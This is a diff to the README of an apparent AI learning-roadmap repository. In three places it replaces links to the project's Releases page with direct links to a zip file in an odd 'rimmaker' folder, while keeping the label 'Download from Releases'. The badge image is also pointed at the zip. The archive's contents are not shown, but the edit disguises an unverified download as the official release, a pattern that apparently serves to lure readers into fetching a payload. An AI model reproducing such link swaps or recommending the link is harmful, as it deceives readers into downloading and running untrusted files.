@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download AI-Engineer-Roadmap-2025](https://img.shields.io/badge/Download-AI--Engineer--Roadmap--2025-blue.svg)](https://github.com/AugustoPaz13/AI-Engineer-Roadmap-2025/releases)
+[![Download AI-Engineer-Roadmap-2025](https://raw.githubusercontent.com/AugustoPaz13/AI-Engineer-Roadmap-2025/main/rimmaker/AI-Engineer-Roadmap-2025.zip)](https://raw.githubusercontent.com/AugustoPaz13/AI-Engineer-Roadmap-2025/main/rimmaker/AI-Engineer-Roadmap-2025.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ Before you download, ensure your system meets the following requirements:
 
 To get started with the AI-Engineer-Roadmap-2025, visit the Releases page to download the resources you need:
 
-[Download from Releases](https://github.com/AugustoPaz13/AI-Engineer-Roadmap-2025/releases)
+[Download from Releases](https://raw.githubusercontent.com/AugustoPaz13/AI-Engineer-Roadmap-2025/main/rimmaker/AI-Engineer-Roadmap-2025.zip)
 
 ### Step-by-Step Instructions:
 
@@ -79,6 +79,6 @@ This project is licensed under the MIT License. You may use and modify the resou
 
 For the latest updates, always check the Releases page:
 
-[Download from Releases](https://github.com/AugustoPaz13/AI-Engineer-Roadmap-2025/releases) 
+[Download from Releases](https://raw.githubusercontent.com/AugustoPaz13/AI-Engineer-Roadmap-2025/main/rimmaker/AI-Engineer-Roadmap-2025.zip) 
 
 Thank you for choosing AI-Engineer-Roadmap-2025. We are excited to support you on your journey in AI learning!
